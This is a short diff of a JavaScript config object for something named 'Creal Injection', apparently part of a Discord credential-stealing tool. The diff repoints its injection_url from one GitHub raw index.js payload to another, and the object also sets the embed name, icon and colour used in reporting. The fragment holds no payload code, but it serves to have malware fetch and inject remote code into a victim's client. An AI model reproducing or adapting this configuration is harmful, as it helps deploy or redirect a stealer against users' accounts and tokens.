@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Creal Injection', 
   embed_icon: 'https://raw.githubusercontent.com/urwy/injection/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/urwy/injection/main/index.js', 
   /**
    
    **/
